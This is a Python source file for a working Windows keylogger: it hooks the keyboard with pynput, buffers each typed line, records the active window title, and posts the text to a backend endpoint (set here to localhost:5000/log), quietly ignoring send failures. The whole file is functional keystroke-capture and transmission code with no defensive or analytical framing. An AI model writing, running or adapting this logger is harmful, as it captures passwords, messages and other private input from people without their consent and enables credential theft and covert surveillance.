from pynput import keyboard
import requests
import json
import win32gui
from threading import Thread
import time

class Keylogger:
    def __init__(self):
        self.api_url = "http://localhost:5000/log"
        self.current_line = []  # Store current line keystrokes
        self.is_running = True
        print("\nKeylogger started. Press Ctrl+C to stop.")
        print("Sending keystrokes when ENTER is pressed...\n")
        self.session = requests.Session()

    def get_window_title(self):
        try:
            return win32gui.GetWindowText(win32gui.GetForegroundWindow())
        except:
            return "Unknown Window"

    def format_key(self, key):
        try:
            # For regular characters
            return key.char
        except AttributeError:
            # For special keys
            special_keys = {
                keyboard.Key.space: " ",
                keyboard.Key.tab: "[TAB]",
                keyboard.Key.backspace: "[BACK]",
                keyboard.Key.delete: "[DEL]",
            }
            return special_keys.get(key, "")

    def send_to_backend(self, text, window_title):
        """Send collected text to backend"""
        try:
            data = {
                "keys": text,
                "window": window_title
            }
            
            self.session.post(
                self.api_url,
                json=data,
                headers={"Content-Type": "application/json"},
                timeout=1
            )
        except requests.exceptions.RequestException:
            # Silently handle connection errors
            pass

    def handle_backspace(self):
        """Handle backspace key"""
        if self.current_line:
            self.current_line.pop()

    def on_press(self, key):
        """Handle key press events"""
        try:
            # Handle Enter key - send the current line
            if key == keyboard.Key.enter:
                if self.current_line:
                    text = ''.join(self.current_line)
                    window_title = self.get_window_title()
                    self.send_to_backend(text, window_title)
                    self.current_line = []  # Clear the current line
                return True

            # Handle backspace
            if key == keyboard.Key.backspace:
                self.handle_backspace()
                return True

            # Format the key
            key_char = self.format_key(key)
            if key_char:  # Only add printable characters
                self.current_line.append(key_char)

            return True

        except Exception as e:
            print(f"Error processing key: {str(e)}")
            return True

    def start(self):
        with keyboard.Listener(
            on_press=self.on_press,
            suppress=False
        ) as listener:
            try:
                listener.join()
            except KeyboardInterrupt:
                self.is_running = False
                # Send any remaining text before stopping
                if self.current_line:
                    text = ''.join(self.current_line)
                    window_title = self.get_window_title()
                    self.send_to_backend(text, window_title)
                print("\nKeylogger stopped.")

if __name__ == "__main__":
    try:
        keylogger = Keylogger()
        keylogger.start()
    except Exception as e:
        print(f"Error: {str(e)}")